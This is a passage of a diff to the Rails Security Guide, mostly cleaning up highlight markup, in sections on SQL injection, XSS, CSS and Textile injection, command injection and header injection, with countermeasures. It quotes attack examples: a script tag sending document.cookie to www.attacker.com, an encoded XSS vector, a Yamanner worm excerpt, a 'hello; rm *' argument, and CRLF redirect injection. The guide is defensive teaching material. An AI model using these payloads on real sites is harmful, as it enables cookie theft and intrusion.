+    * But reject malformed input 
 
 Whitelists are also a good approach against the human factor of forgetting something in the blacklist.
 
@@ -750,7 +750,7 @@ As you can see, the first part of the array is an SQL fragment with question mar
 Model.where(:login => entered_user_name, :password => entered_password).first
 ```
 
-The array or hash form is only available in model instances. You can try `sanitize_sql()` elsewhere. _(highlight)Make it a habit to think about the security consequences when using an external string in SQL_.
+The array or hash form is only available in model instances. You can try `sanitize_sql()` elsewhere. _Make it a habit to think about the security consequences when using an external string in SQL_.
 
 ### Cross-Site Scripting (XSS)
 
@@ -770,7 +770,7 @@ A relatively new, and unusual, form of entry points are banner advertisements. I
 
 #### HTML/JavaScript Injection
 
-The most common XSS language is of course the most popular client-side scripting language JavaScript, often in combination with HTML. _(highlight)Escaping user input is essential_.
+The most common XSS language is of course the most popular client-side scripting language JavaScript, often in combination with HTML. _Escaping user input is essential_.
 
 Here is the most straightforward test to check for XSS:
 
@@ -796,7 +796,7 @@ These examples don't do any harm so far, so let's see how an attacker can steal 
 For an attacker, of course, this is not useful, as the victim will see his own cookie. The next example will try to load an image from the URL http://www.attacker.com/ plus the cookie. Of course this URL does not exist, so the browser displays nothing. But the attacker can review his web server's access log files to see the victim's cookie.
 
 ```html
-<script>document.write('<img src="http://www.attacker.com/' <plus> document.cookie <plus> '">');</script>
+<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
 ```
 
 The log files on www.attacker.com will read like this:
@@ -828,9 +828,9 @@ http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode
 
 ##### Countermeasures
 
-_(highlight)It is very important to filter malicious input, but it is also important to escape the output of the web application_.
+_It is very important to filter malicious input, but it is also important to escape the output of the web application_.
 
-Especially for XSS, it is important to do _(highlight)whitelist input filtering instead of blacklist_. Whitelist filtering states the values allowed as opposed to the values not allowed. Blacklists are never complete.
+Especially for XSS, it is important to do _whitelist input filtering instead of blacklist_. Whitelist filtering states the values allowed as opposed to the values not allowed. Blacklists are never complete.
 
 Imagine a blacklist deletes “script” from the user input. Now the attacker injects “&lt;scrscriptipt&gt;”, and after the filter, “&lt;script&gt;” remains. Earlier versions of Rails used a blacklist approach for the strip_tags(), strip_links() and sanitize() method. So this kind of injection was possible:
 
@@ -847,15 +847,15 @@ s = sanitize(user_input, :tags => tags, :attributes => %w(href title))
 
 This allows only the given tags and does a good job, even against all kinds of tricks and malformed tags.
 
-As a second step, _(highlight)it is good practice to escape all output of the application_, especially when re-displaying user input, which hasn't been input-filtered (as in the search form example earlier on). _(highlight)Use `escapeHTML()` (or its alias `h()`) method_ to replace the HTML input characters &amp;, &quot;, &lt;, &gt; by their uninterpreted representations in HTML (`&amp;amp;`, `&amp;quot;`, `&amp;lt`;, and `&amp;gt;`). However, it can easily happen that the programmer forgets to use it, so <em class=[highlight">it is recommended to use the "SafeErb](http://safe-erb.rubyforge.org/svn/plugins/safe_erb/) plugin</em>. SafeErb reminds you to escape strings from external sources.
+As a second step, _it is good practice to escape all output of the application_, especially when re-displaying user input, which hasn't been input-filtered (as in the search form example earlier on). _Use `escapeHTML()` (or its alias `h()`) method_ to replace the HTML input characters &amp;, &quot;, &lt;, &gt; by their uninterpreted representations in HTML (`&amp;`, `&quot;`, `&lt`;, and `&gt;`). However, it can easily happen that the programmer forgets to use it, so _it is recommended to use the [SafeErb](http://safe-erb.rubyforge.org/svn/plugins/safe_erb/) plugin_. SafeErb reminds you to escape strings from external sources.
 
 ##### Obfuscation and Encoding Injection
 
 Network traffic is mostly based on the limited Western alphabet, so new character encodings, such as Unicode, emerged, to transmit characters in other languages. But, this is also a threat to web applications, as malicious code can be hidden in different encodings that the web browser might be able to process, but the web application might not. Here is an attack vector in UTF-8 encoding:
 
-```html
-<IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;
-  &amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;>
+```
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;
+  &#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
 ```
 
 This example pops up a message box. It will be recognized by the above sanitize() filter, though. A great tool to obfuscate and encode strings, and thus “get to know your enemy”, is the [Hackvertor](https://hackvertor.co.uk/public). Rails' sanitize() method does a good job to fend off encoding attacks.
@@ -866,7 +866,7 @@ _In order to understand today's attacks on web applications, it's best to take a
 
 The following is an excerpt from the [Js.Yamanner@m](http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&tabid=1) Yahoo! Mail [worm](http://groovin.net/stuff/yammer.txt). It appeared on June 11, 2006 and was the first webmail interface worm:
 
-```html
+```
 <img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
   target=""onload="var http_request = false;    var Email = '';
   var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
@@ -918,7 +918,7 @@ The [moz-binding](http://www.securiteam.com/securitynews/5LP051FHPE.html) CSS pr
 
 #### Countermeasures
 
-This example, again, showed that a blacklist filter is never complete. However, as custom CSS in web applications is a quite rare feature, I am not aware of a whitelist CSS filter. _(highlight)If you want to allow custom colors or images, you can allow the user to choose them and build the CSS in the web application_. Use Rails' `sanitize()` method as a model for a whitelist CSS filter, if you really need one.
+This example, again, showed that a blacklist filter is never complete. However, as custom CSS in web applications is a quite rare feature, I am not aware of a whitelist CSS filter. _If you want to allow custom colors or images, you can allow the user to choose them and build the CSS in the web application_. Use Rails' `sanitize()` method as a model for a whitelist CSS filter, if you really need one.
 
 ### Textile Injection
 
@@ -947,13 +947,13 @@ RedCloth.new("<a href='javascript:alert(1)'>hello</a>", [:filter_html]).to_html
 
 #### Countermeasures
 
-It is recommended to _(highlight)use RedCloth in combination with a whitelist input filter_, as described in the countermeasures against XSS section.
+It is recommended to _use RedCloth in combination with a whitelist input filter_, as described in the countermeasures against XSS section.
 
 ### Ajax Injection
 
 NOTE: _The same security precautions have to be taken for Ajax actions as for “normal” ones. There is at least one exception, however: The output has to be escaped in the controller already, if the action doesn't render a view._
 
-If you use the [in_place_editor plugin](http://dev.rubyonrails.org/browser/plugins/in_place_editing), or actions that return a string, rather than rendering a view, _(highlight)you have to escape the return value in the action_. Otherwise, if the return value contains a XSS string, the malicious code will be executed upon return to the browser. Escape any input value using the h() method.
+If you use the [in_place_editor plugin](http://dev.rubyonrails.org/browser/plugins/in_place_editing), or actions that return a string, rather than rendering a view, _you have to escape the return value in the action_. Otherwise, if the return value contains a XSS string, the malicious code will be executed upon return to the browser. Escape any input value using the h() method.
 
 ### Command Line Injection
 
@@ -961,7 +961,7 @@ NOTE: _Use user-supplied command line parameters with caution._
 
 If your application has to execute commands in the underlying operating system, there are several methods in Ruby: exec(command), syscall(command), system(command) and `command`. You will have to be especially careful with these functions if the user may enter the whole command, or a part of it. This is because in most shells, you can execute another command at the end of the first one, concatenating them with a semicolon (;) or a vertical bar (|).
 
-A countermeasure is to _(highlight)use the `system(command, parameters)` method which passes command line parameters safely_.
+A countermeasure is to _use the `system(command, parameters)` method which passes command line parameters safely_.
 
 ```ruby
 system("/bin/echo","hello; rm *")
@@ -973,9 +973,9 @@ system("/bin/echo","hello; rm *")
 
 WARNING: _HTTP headers are dynamically generated and under certain circumstances user input may be injected. This can lead to false redirection, XSS or HTTP response splitting._
 
-HTTP request headers have a Referer, User-Agent (client software), and Cookie field, among others. Response headers for example have a status code, Cookie and Location (redirection target URL) field. All of them are user-supplied and may be manipulated with more or less effort. _(highlight)Remember to escape these header fields, too._ For example when you display the user agent in an administration area.
+HTTP request headers have a Referer, User-Agent (client software), and Cookie field, among others. Response headers for example have a status code, Cookie and Location (redirection target URL) field. All of them are user-supplied and may be manipulated with more or less effort. _Remember to escape these header fields, too._ For example when you display the user agent in an administration area.
 
-Besides that, it is _(highlight)important to know what you are doing when building response headers partly based on user input._ For example you want to redirect the user back to a specific page. To do that you introduced a “referer“ field in a form to redirect to the given address:
+Besides that, it is _important to know what you are doing when building response headers partly based on user input._ For example you want to redirect the user back to a specific page. To do that you introduced a “referer“ field in a form to redirect to the given address:
 
 ```ruby
 redirect_to params[:referer]
@@ -1002,7 +1002,7 @@ HTTP/1.1 302 Moved Temporarily
 Location: http://www.malicious.tld
 ```
 
-So _(highlight)attack vectors for Header Injection are based on the injection of CRLF characters in a header field._ And what could an attacker do with a false redirection? He could redirect to a phishing site that looks the same as yours, but asks to login again (and sends the login credentials to the attacker). Or he could install malicious software through browser security holes on that site. Rails 2.1.2 escapes these characters for the Location field in the `redirect_to` method. _(highlight)Make sure you do it yourself when you build other header fields with user input._
+So _attack vectors for Header Injection are based on the injection of CRLF characters in a header field._ And what could an attacker do with a false redirection? He could redirect to a phishing site that looks the same as yours, but asks to login again (and sends the login credentials to the attacker). Or he could install malicious software through browser security holes on that site. Rails 2.1.2 escapes these characters for the Location field in the `redirect_to` method. _Make sure you do it yourself when you build other header fields with user input._
 
 #### Response Splitting
 
@@ -1025,7 +1025,7 @@ Transfer-Encoding: chunked
 Content-Type: text/html
 ```
 
-Under certain circumstances this would present the malicious HTML to the victim. However, this only seems to work with Keep-Alive connections (and many browsers are using one-time connections). But you can't rely on this. _(highlight)In any case this is a serious bug, and you should update your Rails to version 2.0.5 or 2.1.2 to eliminate Header Injection (and thus response splitting) risks._
+Under certain circumstances this would present the malicious HTML to the victim. However, this only seems to work with Keep-Alive connections (and many browsers are using one-time connections). But you can't rely on this. _In any case this is a serious bug, and you should update your Rails to version 2.0.5 or 2.1.2 to eliminate Header Injection (and thus response splitting) risks._
 
 
 Default Headers
@@ -1057,6 +1057,7 @@ config.action_dispatch.default_headers.clear
 ```
 
 Here is the list of common headers:
+
 * X-Frame-Options
 _'SAMEORIGIN' in Rails by default_ - allow framing on same domain. Set it to 'DENY' to deny framing at all or 'ALLOWALL' if you want to allow framing for all website. 
 * X-XSS-Protection
